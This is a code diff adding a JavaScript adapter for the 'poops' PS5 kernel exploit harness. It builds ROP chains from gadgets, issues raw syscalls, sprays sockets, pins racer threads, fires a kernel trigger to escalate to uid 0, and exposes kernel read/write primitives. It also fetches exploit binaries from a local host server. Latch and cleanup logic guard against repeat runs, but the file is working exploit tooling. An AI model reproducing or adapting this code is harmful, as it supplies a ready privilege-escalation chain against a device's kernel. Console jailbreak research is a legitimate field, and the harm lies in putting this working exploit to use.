@@ -1,0 +1,962 @@
+// Adapt the poops harness to the loader API.
+
+const WATCHDOG_MS = 15000;
+const CHAIN_STACK_SIZE = 0x80000;
+const CHAIN_RESERVED = 0x10000;
+
+// Count ROP slots locally: the gated chain counts recorded operations.
+// Reproduce fcall padding from the exposed stack entry point.
+function makeWorkerChain(api) {
+  const gated = api.chain;
+  const gadgets = api.gadgets;
+  const entryPoint = gated.stack_entry_point;
+  if (!entryPoint)
+    throw new Error(
+      "api.chain has no stack_entry_point. This loader build predates the poops " +
+      "payload: re-cache the loader (installer, or reload the User's Guide) and " +
+      "send it again. Without the entry point a fcall's alignment padding cannot " +
+      "be predicted, and every call in the exploit would land misaligned.");
+
+  // prepareChain adds three prologue slots: pop rdi, context pointer, setjmp.
+  const PROLOGUE_SLOTS = 3;
+
+  const REGISTER_GADGETS = ["pop rdi", "pop rsi", "pop rdx", "pop rcx", "pop r8", "pop r9"];
+  for (const name of REGISTER_GADGETS)
+    if (gadgets[name] === undefined)
+      throw new Error("offsets/" + api.fw + " has no " + JSON.stringify(name) + " gadget");
+  for (const name of ["mov [rdi], eax", "ret"])
+    if (gadgets[name] === undefined)
+      throw new Error("offsets/" + api.fw + " has no " + JSON.stringify(name) + " gadget");
+
+  let slots = PROLOGUE_SLOTS;
+  const reset = () => { slots = PROLOGUE_SLOTS; };
+
+  const chain = {
+    stack_size: CHAIN_STACK_SIZE,
+    reserved_stack: CHAIN_RESERVED,
+    get initial_count() { return gated.initial_count; },
+    get count() { return slots; },
+    get return_value() { return gated.return_value; },
+
+    clear() { gated.clear(); reset(); },
+
+    push(value) { gated.push(value); slots++; },
+
+    push_write4(dest, value) {
+      gated.push(gadgets["pop rdi"]); gated.push(dest);
+      gated.push(gadgets["pop rax"]); gated.push(value);
+      gated.push(gadgets["mov [rdi], eax"]);
+      slots += 5;
+    },
+    write_result(dest) {
+      gated.push(gadgets["pop rdi"]); gated.push(dest);
+      gated.push(gadgets["mov [rdi], rax"]);
+      slots += 3;
+    },
+    write_result4(dest) {
+      // Return cells are four bytes; an eight-byte store would overwrite the next cell.
+      gated.push(gadgets["pop rdi"]); gated.push(dest);
+      gated.push(gadgets["mov [rdi], eax"]);
+      slots += 3;
+    },
+
+    // Mirror of rop.js fcall(): six SysV register loads, then the alignment
+    // `ret`, then the target. Same condition, same order, one place.
+    fcall(rip, a1, a2, a3, a4, a5, a6) {
+      const args = [a1, a2, a3, a4, a5, a6];
+      for (let i = 0; i < args.length; i++) {
+        if (args[i] == undefined) continue;
+        gated.push(gadgets[REGISTER_GADGETS[i]]);
+        gated.push(args[i]);
+        slots += 2;
+      }
+      // Match rop.js alignment arithmetic, including 32-bit address wrapping.
+      if (((entryPoint.low + slots * 8) >>> 0) & 8) {
+        gated.push(gadgets["ret"]);
+        slots++;
+      }
+      gated.push(rip);
+      slots++;
+    },
+
+    add_syscall(nr, a1, a2, a3, a4, a5, a6) {
+      chain.fcall(api.syscalls[nr], a1, a2, a3, a4, a5, a6);
+    },
+    add_syscall_ret(retstore, nr, a1, a2, a3, a4, a5, a6) {
+      chain.fcall(api.syscalls[nr], a1, a2, a3, a4, a5, a6);
+      chain.write_result(retstore);
+    },
+
+    run: () => gated.run().then(() => reset()),
+    syscall: (...a) => gated.syscall(...a).then((v) => { reset(); return v; }),
+    call: (...a) => gated.call(...a).then((v) => { reset(); return v; }),
+  };
+
+  return chain;
+}
+
+// Buffer telemetry and drain at row boundaries or on the mid-race paint cadence.
+const TELEMETRY_LIMIT = 4000;
+
+// upstream's SCREEN_MS.
+const PAINT_MS = 250;
+
+
+class Telemetry {
+  constructor(say, paintEnabled) {
+    this.say = say;
+    this.paintEnabled = paintEnabled !== false;
+    this.lines = [];
+    this.dropped = 0;
+    this.queued = 0;
+    this.blocked = 0;
+    this.notes = [];
+    this.raceMode = false;
+    this.chainMarksQuiet = false;
+    this.lastPaint = 0;
+    this.painting = false;
+    this.paints = 0;
+    this.drains = 0;
+    this.writes = 0;
+    this.raceWrites = 0;
+    this.emitted = 0;
+    this.bytes = 0;
+    this.issueMs = 0;
+    this.dropped = 0;
+  }
+
+  clean(text) {
+    return String(text)
+      .replace(/[\r\n\t]+/g, " ")
+      .replace(/[^\x20-\x7e]/g, "")
+      .slice(0, 300);
+  }
+
+  mark(tag, detail) {
+    if (this.raceMode && tag !== "TRIGGER-ARMED" && tag !== "LATCH-ESCALATE") {
+      this.queued++;
+      this.push(`${tag} ${this.clean(detail)}`);
+      return;
+    }
+    this.blocked++;
+    this.push(`${tag} ${this.clean(detail)}`);
+  }
+
+  push(line) {
+    if (this.lines.length >= TELEMETRY_LIMIT) {
+      this.lines.shift();
+      this.dropped++;
+    }
+    this.lines.push(line);
+    if (this.raceMode) this.maybePaint();
+  }
+
+  maybePaint() {
+    if (!this.paintEnabled || this.painting) return;
+    const now = Date.now();
+    if (now - this.lastPaint < PAINT_MS) return;
+    this.lastPaint = now;
+    this.painting = true;
+    this.paint().then(() => { this.painting = false; }, () => { this.painting = false; });
+  }
+
+  note(text) {
+    const line = this.clean(text);
+    if (this.notes.length < 200) this.notes.push(line);
+    this.push(`note ${line}`);
+  }
+
+  // Mid-race paints are asynchronous; serialisation orders their writes with chain work.
+  async paint() {
+    if (this.lines.length === 0 || !this.paintEnabled) return;
+    const batch = this.lines;
+    this.lines = [];
+    this.paints++;
+    await this.write(batch, "race");
+  }
+
+  // The row boundary, and every flushQueue() seam. Everything buffered goes.
+  async drain() {
+    if (this.lines.length === 0) return;
+    const batch = this.lines;
+    this.lines = [];
+    this.drains++;
+    await this.write(batch, "row");
+  }
+
+  // Measure synchronous issue cost; awaiting a write also includes shared queue delays.
+  async write(batch, kind) {
+    if (this.dropped) {
+      batch.unshift(`(${this.dropped} earlier lines were dropped by the telemetry ring)`);
+      this.dropped = 0;
+    }
+    // Issue all lines before awaiting so the loader can coalesce them into one flush.
+    const t0 = Date.now();
+    const writes = batch.map((line) => this.say(line, "info"));
+    const issueMs = Date.now() - t0;
+    this.emitted += batch.length;
+    this.writes++;
+    this.bytes += batch.length;
+    if (kind === "race") this.raceWrites++;
+    this.issueMs += issueMs;
+    await Promise.all(writes);
+  }
+
+  stats() { return { queued: this.queued, blocked: this.blocked }; }
+
+  cost() {
+    return {
+      emitted: this.emitted, bytes: this.bytes, writes: this.writes,
+      paints: this.paints, drains: this.drains, raceWrites: this.raceWrites,
+      dropped: this.dropped, issueMs: this.issueMs,
+    };
+  }
+}
+
+// Store the latch and cleanup verdict separately. Only a clean verdict allows an
+// automatic retry; dirty or missing verdicts require a reboot or explicit override.
+const LATCH_KEY = "poops-latch";
+const VERDICT_KEY = "poops-verdict";
+
+const VERDICT_CLEAN = "clean";
+const VERDICT_DIRTY = "dirty";
+
+// Whether the one-shot latch is currently held. Read through the same accessor the
+// latch writes with, so the summary cannot disagree with the refusal it is
+// explaining.
+function latchStoreIsHeld() {
+  try { return !!sessionStorage.getItem(LATCH_KEY); } catch { return false; }
+}
+
+function lastVerdict() {
+  try { return sessionStorage.getItem(VERDICT_KEY) || ""; } catch { return ""; }
+}
+
+function recordVerdict(clean) {
+  try { sessionStorage.setItem(VERDICT_KEY, clean ? VERDICT_CLEAN : VERDICT_DIRTY); }
+  catch { /* private mode: the latch is then in-memory only, and a reload clears it */ }
+}
+
+function clearVerdict() {
+  try { sessionStorage.removeItem(VERDICT_KEY); } catch { /* ignore */ }
+}
+
+function makeLatch(telemetry, say) {
+  const clean = (text) =>
+    String(text).replace(/[^A-Za-z0-9_.:=,+-]/g, "_").slice(0, 200);
+
+  const store = {
+    get() { try { return sessionStorage.getItem(LATCH_KEY) || ""; } catch { return ""; } },
+    set(value) {
+      try { sessionStorage.setItem(LATCH_KEY, value); } catch { /* private mode */ }
+      // A new run invalidates the previous verdict. Until THIS run reaches a
+      // verdict of its own there is nothing that authorises a retry, which is the
+      // correct state for "a run is in progress or died without saying".
+      clearVerdict();
+    },
+    del() {
+      try { sessionStorage.removeItem(LATCH_KEY); } catch { /* ignore */ }
+      clearVerdict();
+    },
+  };
+
+  const latch = {
+    read() {
+      const detail = store.get();
+      return { set: detail ? 1 : 0, detail };
+    },
+    async set(detail) {
+      const d = clean(detail);
+      store.set(d || "set");
+      telemetry.mark("LATCH-SET", d);
+      return { set: 1, detail: d };
+    },
+    async escalate(detail) {
+      const d = clean(detail);
+      store.set(d || "escalated");
+      telemetry.mark("LATCH-ESCALATE", d);
+      await say(
+        "the latch escalated -- kernel state from this run is not clean: " + d +
+        ". A second poops run in this session would re-fire the trigger against a " +
+        "kernel this run already touched; reboot the console before trying again.",
+        "warn");
+      return { set: 1, detail: d };
+    },
+    async clear() {
+      telemetry.mark("LATCH-CLEAR", "operator-request");
+      store.del();
+      return { set: 0, detail: "" };
+    },
+  };
+  return latch;
+}
+
+// Read harness settings from api.args.
+function makeConfig(api) {
+  const args = api.args || [];
+  const flag = (name) => args.includes(name);
+  const value = (name) => {
+    const hit = args.find((a) => a.startsWith(name + "="));
+    return hit ? hit.slice(name.length + 1) : null;
+  };
+  const clamp = (n, lo, hi, fallback) =>
+    Math.max(lo, Math.min(hi, parseInt(n || "", 10) || fallback));
+
+  // Default to a live run; trigger=none selects the negative control.
+  const triggerRaw = (value("trigger") || "netcontrol").toLowerCase();
+  const trigger = (triggerRaw === "netcontrol" || triggerRaw === "overflow")
+    ? triggerRaw : "none";
+
+  const burnRaw = (value("burn") || "probe").toLowerCase();
+  const burn = (burnRaw === "none" || burnRaw === "full") ? burnRaw : "probe";
+
+  const defaultAttempts = trigger === "overflow" ? 96 : trigger === "netcontrol" ? 8 : 1;
+
+  return {
+    payload: value("payload") === null ? "1" : value("payload"),
+    trigger,
+    burn,
+    netprobe: flag("netprobe"),
+    sockets: clamp(value("sockets"), 4, 128, 80),
+    attempts: clamp(value("attempts"), 1, 512, defaultAttempts),
+    kqBatch: clamp(value("kqbatch"), 1, 32, 8),
+    kqRounds: clamp(value("kqrounds"), 8, 50000, 5000),
+    kqConfirm: !flag("noconfirm"),
+    burnRounds: clamp(value("burnrounds"), 1, 100000, 20),
+    burnUnroll: clamp(value("burnunroll"), 1, 512, 512),
+
+    twinDeadlineMs: 20000,
+    reclaimDeadlineMs: 30000,
+    tripletDeadlineMs: 30000,
+    repairDeadlineMs: 30000,
+    stage0DeadlineMs: clamp(value("stage0deadline"), 30000, 900000, 300000),
+    stage1DeadlineMs: 120000,
+    stage2Attempts: 5,
+    stage2DeadlineMs: clamp(value("stage2deadline"), 60000, 3600000, 900000),
+    kreadLoopDeadlineMs: clamp(value("kreadloopdeadline"), 1000, 600000, 30000),
+  };
+}
+
+// Wrap syscall results in the harness shape: raw, s32, failed, hex, errText.
+const NUM_TEXT = (n) => "0x" + n.toString(16).toUpperCase().padStart(3, "0");
+
+function makeSys(ctx) {
+  const { P, telemetry, say, state } = ctx;
+
+  function classify(raw) {
+    const hi = raw.hi >>> 0, lo = raw.low >>> 0;
+    return { failed: (hi === 0xffffffff) && (lo >= 0xfffff000), s32: lo | 0 };
+  }
+
+  function errText(res) {
+    if (!res.failed) return "ok";
+    const n = -res.s32;
+    if (res.s32 === -1) return "ret=-1, errno set but not readable from here";
+    return "ret=" + res.s32 + " (would be " + (ERRNO[n] || ("errno " + n)) +
+      " if the stubs returned -errno)";
+  }
+
+  return async function sys(num, a, b, c, d, e, f) {
+    if (ctx.chainDead) throw new Error("sys: the chain is unusable after '" + ctx.chainDead + "'");
+    if (Object.prototype.hasOwnProperty.call(BANNED, num))
+      throw new Error("sys: syscall " + NUM_TEXT(num) + " is BANNED -- " + BANNED[num]);
+    if (P.syscalls[num] === undefined)
+      throw new Error("sys: " + NUM_TEXT(num) + " has no stub in offsets/" + ctx.fw + ".js");
+
+    state.syscallsIssued.add(num);
+    const started = Date.now();
+    // Use the facade so syscall execution also resets its slot counter.
+    const raw = await ctx.watchdog(
+      ctx.chain.syscall(num, a, b, c, d, e, f),
+      "syscall " + NUM_TEXT(num));
+    state.roundTrips.push(Date.now() - started);
+
+    const cl = classify(raw);
+    const res = { raw, s32: cl.s32, failed: cl.failed, hex: "0x" + raw.toString(), errText: "" };
+    res.errText = errText(res);
+    return res;
+  };
+}
+
+// --- the context poops.js destructures ---------------------------------------
+function makeContext(api, launchKexp) {
+  const P = api.p;
+  const chain = makeWorkerChain(api);
+  const i64 = (lo, hi) => new int64(lo >>> 0, hi >>> 0);
+  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+  const telemetry = new Telemetry(api.log, !(api.args || []).includes("nopaint"));
+
+  const state = {
+    syscallsIssued: new Set(),
+    roundTrips: [],
+    heapBytes: 0,
+    syncBlocks: 0,
+    syncBytes: 0,
+    threadObjectsBuilt: 0,
+    threadsCreated: 0,
+    threadsExited: 0,
+    tornWrites: [],
+    groups: [],
+    fdOpen: new Set(),
+    fdBaseline: -1,
+    cleanupFailed: "",
+  };
+
+  const driver = {
+    origMaskBytes: null,
+    origMaskHex: "",
+    origPrioType: -1,
+    origPrio: -1,
+    core: -1,
+    coreWhy: "",
+    tid: 0,
+    pid: 0,
+    pinned: false,
+    prioChanged: false,
+    affChanged: false,
+  };
+
+  const cfg = makeConfig(api);
+  const latch = makeLatch(telemetry, api.log);
+
+  const ctx = {
+    fw: api.fw,
+    say: api.log,
+    chainDead: "",
+    chainDeadMark: "",
+    P, chain, i64, cfg, state, driver, latch, telemetry,
+
+    // Keep execution through the facade to maintain its slot counter.
+    launchKexp,
+
+    sys: null,
+    runChain: null,
+    watchdog: null,
+
+    flushMark: (tag, detail) => telemetry.mark(tag, detail),
+    queueEvent: (tag, detail) => telemetry.mark(tag, detail),
+    note: (text) => telemetry.note(text),
+    sleep,
+
+    mem: (n) => {
+      const ptr = P.malloc(n, 1);
+      return { ptr, u8: ptr.backing };
+    },
+
+    track: (fd) => state.fdOpen.add(fd),
+    untrack: (fd) => state.fdOpen.delete(fd),
+
+    PASS: (detail) => ({ status: "PASS", detail }),
+    FAIL: (detail) => ({ status: "FAIL", detail }),
+    NA: (detail) => ({ status: "SKIP", detail }),
+
+    markStats: () => telemetry.stats(),
+    // Flush at upstream repaint seams without awaiting; the gated chain queues after logs.
+    flushQueue: () => telemetry.drain(),
+    setRaceMode: (on) => {
+      const was = telemetry.raceMode;
+      telemetry.raceMode = !!on;
+      return was;
+    },
+    setChainMarksQuiet: (quiet) => {
+      const was = telemetry.chainMarksQuiet;
+      telemetry.chainMarksQuiet = !!quiet;
+      return was;
+    },
+    chainDeadNow: () => !!ctx.chainDead,
+    verdictBanner: (kind, text) => { telemetry.mark("VERDICT", kind + ": " + text); },
+    measured: {},
+  };
+
+  // A watchdog timeout disables later chain work, including teardown.
+  ctx.watchdog = function watchdog(promise, what) {
+    if (ctx.chainDead)
+      return Promise.reject(new Error("WATCHDOG: the chain already died at '" + ctx.chainDead + "'"));
+    let timer;
+    const armed = new Promise((_resolve, reject) => {
+      timer = setTimeout(() => {
+        ctx.chainDead = what;
+        state.cleanupFailed = "the ROP chain died at '" + what + "'";
+        telemetry.mark("CHAIN-DEAD", what);
+        reject(new Error("WATCHDOG"));
+      }, WATCHDOG_MS);
+    });
+    return Promise.race([promise, armed]).finally(() => clearTimeout(timer));
+  };
+
+  ctx.runChain = async function runChain() {
+    if (ctx.chainDead)
+      throw new Error("runChain: the chain is unusable after '" + ctx.chainDead + "'");
+    const started = Date.now();
+    // Run through the facade to reset its slot counter.
+    await ctx.watchdog(ctx.chain.run(), "chain.run");
+    state.roundTrips.push(Date.now() - started);
+  };
+
+  ctx.sys = makeSys(ctx);
+  return ctx;
+}
+
+// Choose a core from the inherited affinity mask before preflight.
+async function chooseCore(ctx) {
+  const { P, driver, telemetry } = ctx;
+  const m = ctx.mem(K.CPUSET_SIZE);
+  for (let i = 0; i < K.CPUSET_SIZE; ++i) m.u8[i] = 0;
+
+  telemetry.mark("INHERITED-MASK-PRE", "syscall=cpuset_getaffinity-0x1e7-buf=0x" + m.ptr.toString());
+  const r = await ctx.sys(0x1e7, K.CPU_LEVEL_WHICH, K.CPU_WHICH_TID,
+    new int64(0xffffffff, 0xffffffff), K.CPUSET_SIZE, m.ptr);
+  if (r.failed)
+    throw new Error("cpuset_getaffinity failed (" + r.errText + "). Refusing to pin anything blind.");
+
+  const bytes = new Uint8Array(K.CPUSET_SIZE);
+  for (let i = 0; i < K.CPUSET_SIZE; ++i) bytes[i] = m.u8[i];
+  const word = r32(bytes, 0);
+  driver.origMaskBytes = bytes;
+  driver.origMaskHex = hexBytes(bytes, 0, K.CPUSET_SIZE);
+  telemetry.mark("INHERITED-MASK", "mask=0x" + word.toString(16) + "-cores=" +
+    coreList(word) + "-bytes=" + driver.origMaskHex);
+  if (word === 0) throw new Error("the inherited affinity mask is 0");
+
+  const override = parseInt((ctx.argsValue("core") || ""), 10);
+  let core;
+  if (override >= 0) {
+    if (override > 15 || ((word >>> override) & 1) === 0)
+      throw new Error("core=" + override + " is not set in the inherited mask 0x" +
+        word.toString(16) + " (available: " + coreList(word) +
+        "). cpuset_setaffinity would fail and every test below would still appear to work.");
+    core = override;
+    driver.coreWhy = "chosen explicitly with core=" + override +
+      " and confirmed present in the inherited mask";
+  } else {
+    core = -1;
+    for (let i = 15; i >= 0; --i) if ((word >>> i) & 1) { core = i; break; }
+    driver.coreWhy = "the highest core set in the INHERITED mask 0x" + word.toString(16) +
+      " (available: " + coreList(word) + "). Derived, not hardcoded: poops.c:52 uses 5 " +
+      "and p2jb.js:193 uses 4, and neither exists here.";
+  }
+  if (core < 0 || core > 15)
+    throw new Error("no usable core in 0..15 from mask 0x" + word.toString(16));
+  driver.core = core;
+  telemetry.mark("CORE-CHOSEN", "core=" + core);
+  return core;
+}
+
+async function captureDriverIdentity(ctx, engine) {
+  const { driver, telemetry } = ctx;
+  const self = await engine.H.thrSelf("driver");
+  driver.tid = self.tid;
+  const r0 = await engine.H.readRtprio("driver-original");
+  driver.origPrioType = r0.type;
+  driver.origPrio = r0.prio;
+  const pid = await ctx.sys(0x014);
+  driver.pid = pid.failed ? 0 : pid.s32;
+  telemetry.mark("DRIVER-IDENTITY", "pid=" + driver.pid + "-tid=" + driver.tid +
+    "-mask=" + driver.origMaskHex + "-rtprio=" + driver.origPrioType + "/" +
+    driver.origPrio + "-core=" + driver.core);
+}
+
+async function runLadder(ctx, engine) {
+  const ladder = buildLadder(ctx, engine);
+  let passed = 0, failed = 0, skipped = 0;
+  let stoppedAt = "";
+
+  const reportRow = ladder.find((e) => e.key === "ps7_report");
+  const runRow = reportRow ? ladder.filter((e) => e !== reportRow) : ladder;
+
+  // Exclude telemetry drain time from row duration.
+  const row = async (index, entry, status, detail, notes, ms) => {
+    await ctx.telemetry.drain();
+    const label = entry.key + " [" + entry.label + "]";
+    const took = typeof ms === "number" ? " (" + ms + " ms)" : "";
+    if (status === "PASS") {
+      await ctx.say(label + " -- PASS" + took + (detail ? ": " + detail : ""), "success");
+      for (const n of notes || []) await ctx.say("    " + n, "info");
+    } else if (status === "SKIP") {
+      await ctx.say(label + " -- SKIP" + took + (detail ? ": " + detail : ""), "warn");
+    } else {
+      await ctx.say(label + " -- FAIL" + took + (detail ? ": " + detail : ""), "error");
+      for (const n of notes || []) await ctx.say("    " + n, "info");
+    }
+  };
+
+  for (let i = 0; i < runRow.length; i++) {
+    const entry = runRow[i];
+    if (ctx.state.cleanupFailed) {
+      skipped++;
+      await row(i + 1, entry, "SKIP", "REFUSED -- an earlier step could not clean up: " +
+        ctx.state.cleanupFailed, null);
+      continue;
+    }
+    if (ctx.chainDead) {
+      skipped++;
+      await row(i + 1, entry, "SKIP", "REFUSED -- the chain is unusable after '" +
+        ctx.chainDead + "'. Even the teardown is a chain round trip.", null);
+      continue;
+    }
+
+    ctx.telemetry.notes = [];
+    ctx.telemetry.mark("TEST-ENTER", entry.key);
+    const startedAt = Date.now();
+    let result;
+    try {
+      result = await entry.run();
+      if (!result) result = ctx.FAIL("the test returned nothing");
+    } catch (err) {
+      const message = (err && err.message) || String(err);
+      result = message === "WATCHDOG"
+        ? ctx.FAIL("WATCHDOG: no reply from the ROP worker in " + WATCHDOG_MS +
+          " ms at " + entry.key + ". Everything after this is skipped, including the teardown.")
+        : ctx.FAIL("THREW " + (err && err.name) + ": " + message.slice(0, 400));
+    }
+    const notes = ctx.telemetry.notes.slice();
+    ctx.telemetry.notes = [];
+
+    if (result.status === "PASS") passed++;
+    else if (result.status === "SKIP") skipped++;
+    else failed++;
+    await row(i + 1, entry, result.status, result.detail, notes,
+      Date.now() - startedAt);
+    ctx.telemetry.mark("TEST", entry.key + "-" + result.status +
+      (result.detail ? "-why=" + String(result.detail).replace(/[^\x20-\x7e]/g, "").slice(0, 300) : ""));
+
+    if (result.status === "FAIL") {
+      stoppedAt = entry.key;
+      for (let k = i + 1; k < runRow.length; k++) {
+        skipped++;
+        await row(k + 1, runRow[k], "SKIP", "REFUSED after '" + entry.key + "' failed", null);
+      }
+      break;
+    }
+  }
+
+  // The state report and the teardown run even after a failure, unless there is no
+  // chain left to run them on.
+  let report = null;
+  if (reportRow) {
+    if (ctx.chainDead) {
+      skipped++;
+      await row(ladder.length, reportRow, "SKIP",
+        "IMPOSSIBLE -- the chain died at '" + ctx.chainDead + "'", null);
+    } else {
+      ctx.telemetry.notes = [];
+      ctx.telemetry.mark("TEST-ENTER", "ps7_report-forced");
+      const reportStartedAt = Date.now();
+      try {
+        report = await reportRow.run();
+      } catch (err) {
+        report = ctx.FAIL("PS7 THREW: " + ((err && err.message) || err));
+      }
+      const notes = ctx.telemetry.notes.slice();
+      ctx.telemetry.notes = [];
+      if (report.status === "PASS") passed++;
+      else if (report.status === "SKIP") skipped++;
+      else failed++;
+      await row(ladder.length, reportRow, report.status, report.detail, notes,
+        Date.now() - reportStartedAt);
+      ctx.telemetry.mark("TEST", "ps7_report-" + report.status);
+    }
+  }
+
+  // The fd sweep. It is a chain round trip like everything else, so it obeys the
+  // same blockers poops.html applies.
+  const noClose = (engine && engine.S && engine.S.doNotClose) ? engine.S.doNotClose : new Set();
+  const sweepBlocked = engine && engine.corrupt ? "alias-present"
+    : (engine && engine.triggered ? "trigger-fired"
+      : (ctx.chainDead ? "chain-dead"
+        : (ctx.state.cleanupFailed ? "cleanup-failed"
+          : ((engine && engine.S && engine.S.groupsStillLive.length)
+            ? "racer-group-still-parked" : ""))));
+  const sweepable = Array.from(ctx.state.fdOpen).filter((fd) => !noClose.has(fd));
+  if (sweepable.length && !sweepBlocked) {
+    for (const fd of sweepable) {
+      try { await ctx.sys(0x006, fd); } catch { /* already gone */ }
+      ctx.state.fdOpen.delete(fd);
+    }
+    ctx.telemetry.mark("FD-SWEEP", "closed=" + sweepable.length +
+      "-fds=" + sweepable.slice(0, 24).join("."));
+  } else if (sweepable.length) {
+    ctx.telemetry.mark("FD-STRANDED", "n=" + sweepable.length + "-why=" + sweepBlocked +
+      "-fds=" + sweepable.slice(0, 24).join("."));
+  }
+
+  return { passed, failed, skipped, stoppedAt, ladder: ladder.length, report };
+}
+
+// Cleanup closes the crossed-pipe primitive; disable the published accessors.
+function disarmKrw(handle) {
+  const refuse = (op) => () => {
+    throw new Error(
+      `api.krw.${op}() is disabled: poops' kernel access rides the crossed pipe ` +
+      `pair that the exploit's own cleanup closes before it returns, so the handle ` +
+      `only ever worked inside that one run. Re-run payloads/poops.js and do the ` +
+      `kernel work from there.`);
+  };
+  handle.read8 = refuse("read8");
+  handle.write4 = refuse("write4");
+  handle.write8 = refuse("write8");
+  return handle;
+}
+
+// Use the loader int64 supplied to the page.
+  if (typeof globalThis.int64 !== "function")
+    throw new Error("int64 is missing from the page; src/utils/int64.js did not load");
+
+  return async function (api) {
+  const args = api.args || [];
+  const argValue = (name) => {
+    const hit = args.find((a) => a.startsWith(name + "="));
+    return hit ? hit.slice(name.length + 1) : null;
+  };
+
+  const latchState = latchStoreIsHeld()
+    ? (() => { try { return sessionStorage.getItem(LATCH_KEY) || ""; } catch { return ""; } })()
+    : "";
+
+  if (latchState) {
+    const previousVerdict = lastVerdict();
+    if (args.includes("latch-clear")) {
+      try { sessionStorage.removeItem(LATCH_KEY); } catch { /* ignore */ }
+      clearVerdict();
+      await api.log("latch cleared on request", "info");
+    } else if (previousVerdict === VERDICT_CLEAN) {
+      try { sessionStorage.removeItem(LATCH_KEY); } catch { /* ignore */ }
+      clearVerdict();
+      await api.log(
+        "the latch was held, but the previous run's verdict was CLEAN -- it reported " +
+        "nothing triggered and everything put back, so there is nothing to protect " +
+        "and this run proceeds", "info");
+    } else {
+      await api.log(
+        "the poops latch is already held for this session: " + latchState, "warn");
+      await api.log(
+        "poops opens sockets, parks twelve kernel threads on one core, fires its " +
+        "trigger and escalates to uid 0. Doing that a second time against a kernel " +
+        "the first run already touched is how a working jailbreak turns into a panic, " +
+        "so it will not run twice here. REBOOT the console.", "warn");
+      await api.log(
+        previousVerdict === VERDICT_DIRTY
+          ? "the previous run's verdict was DIRTY (trigger fired, an alias was " +
+            "observed, or the teardown did not complete) -- that is a kernel state " +
+            "only a reboot clears."
+          : "the previous run left no verdict: it stopped before ps7_report, so " +
+            "nobody knows what state the kernel is in. A reboot clears it.",
+        "warn");
+      await api.log(
+        "if you are certain the previous run changed nothing, override with " +
+        "`--arg latch-clear`, or from this session with " +
+        "`return async function (api) { sessionStorage.clear(); }`.", "info");
+      return;
+    }
+  }
+
+  if (typeof api.prefetchKexp !== "function" || typeof api.launchKexp !== "function") {
+    await api.log(
+      "api.prefetchKexp / api.launchKexp are missing. This loader build predates the " +
+      "poops payload: re-cache the loader (installer, or reload the User's Guide) and " +
+      "send it again.", "error");
+    return;
+  }
+  if (api.krw) {
+    await api.log(
+      "this session already holds a krw handle, so the kernel has already been hit. " +
+      "poops fires its trigger on top of that state and will not run here.", "warn");
+    return;
+  }
+
+  await api.log("poops on fw " + api.fw + " (offsets/" + api.fw + ".js)", "info");
+
+  const effective = makeConfig(api);
+  await api.log(
+    `effective settings: trigger=${effective.trigger} attempts=${effective.attempts} ` +
+    `sockets=${effective.sockets} payload=${effective.payload || "(off)"}` +
+    (effective.trigger === "none" ? "  [NEGATIVE CONTROL: nothing will be aliased]" : ""),
+    effective.trigger === "none" ? "info" : "success");
+
+  // Validate the required gadgets before starting the ladder.
+  const missingGadgets = ["ret", "pop rdi", "pop rsi", "pop rdx", "pop rcx", "pop rax",
+    "pop rsp", "pop r8", "pop r9", "mov [rdi], rsi", "mov [rdi], rax", "mov [rdi], eax",
+    "mov rax, [rax]", "inc dword [rax]"]
+    .filter((name) => api.gadgets[name] === undefined);
+  if (missingGadgets.length) {
+    await api.log("offsets/" + api.fw + ".js is missing gadgets this payload needs: " +
+      missingGadgets.join(", "), "error");
+    return;
+  }
+
+  // Classic-script const declarations are lexical globals, not globalThis properties.
+  // Check these offsets by bare identifier.
+  const REQUIRED_OFFSETS = [
+    ["OFFSET_lk_sceKernelGetCurrentCpu",
+      typeof OFFSET_lk_sceKernelGetCurrentCpu,
+      "makeHarness emits it into every racer prologue"],
+    ["OFFSET_lk_pthread_exit",
+      typeof OFFSET_lk_pthread_exit,
+      "thread_rop's exit stub"],
+    ["OFFSET_lk_pthread_create_name_np",
+      typeof OFFSET_lk_pthread_create_name_np,
+      "thread_rop's entry point"],
+    ["OFFSET_lk_pthread_join",
+      typeof OFFSET_lk_pthread_join,
+      "thread_rop's join, used by the harness self-checks"],
+    ["OFFSET_lc_longjmp",
+      typeof OFFSET_lc_longjmp,
+      "thread_rop's thr_new context entry"],
+  ];
+  const missingOffsets = REQUIRED_OFFSETS.filter(([, kind]) => kind !== "number");
+  if (missingOffsets.length) {
+    await api.log("offsets/" + api.fw + ".js does not declare " +
+      missingOffsets.map(([name]) => name).join(", ") +
+      " -- this payload cannot run on fw " + api.fw, "error");
+    for (const [name, , why] of missingOffsets)
+      await api.log("    " + name + ": " + why, "info");
+    return;
+  }
+
+  // Prefetch before starting the exploit.
+  try {
+    await api.prefetchKexp();
+  } catch (e) {
+    await api.log("could not fetch the elfldr/kexp binaries: " +
+      (e && e.message ? e.message : e) +
+      ". Check that host.py is still serving and the PS5 DNS still points at this PC.",
+      "error");
+    return;
+  }
+
+  await api.log("starting", "success");
+
+  const launchKexp = async (options) => {
+    options = options || {};
+    const result = await api.launchKexp(options);
+    // Capture the handle at stage 5 after the jailbreak check.
+    ctx.krw = ctx.buildKrw();
+    return result;
+  };
+
+  const ctx = makeContext(api, launchKexp);
+  ctx.argsValue = argValue;
+
+  let engine;
+  try {
+    await chooseCore(ctx);
+
+    engine = makePoopsEngine(ctx);
+    engine.setFamily(ctx.cfg.trigger);
+    await captureDriverIdentity(ctx, engine);
+
+    // poops.html takes a baseline fd before opening the spray bank, so the bank
+    // knows which descriptors are its own.
+    const first = await ctx.sys(0x061, K.AF_UNIX, K.SOCK_STREAM, 0);
+    if (!first.failed) {
+      ctx.state.fdBaseline = first.s32;
+      await ctx.sys(0x006, ctx.state.fdBaseline);
+    }
+  } catch (e) {
+    await ctx.telemetry.drain();
+    await api.log("setup refused: " + (e && e.message ? e.message : e), "error");
+    if (e && e.stack) for (const line of String(e.stack).split("\n").slice(0, 4))
+      await api.log("  " + line, "error");
+    return;
+  }
+
+  ctx.buildKrw = () => ({
+    ktextBase: null,
+    procFdAddr: engine.S.procFiledesc ? engine.S.procFiledesc.add32(engine.PK.OFF.FILEDESC_OFILES) : null,
+    read8: async (address) => (await engine.kread64Fast(address)).v,
+    write4: async (address, value) => engine.kwrite32Fast(address, value >>> 0),
+    write8: async (address, value) => engine.kwrite64Fast(address, value),
+  });
+
+  let summary;
+  try {
+    summary = await runLadder(ctx, engine);
+  } catch (e) {
+    await ctx.telemetry.drain();
+    await api.log("the ladder threw: " + (e && e.message ? e.message : e), "error");
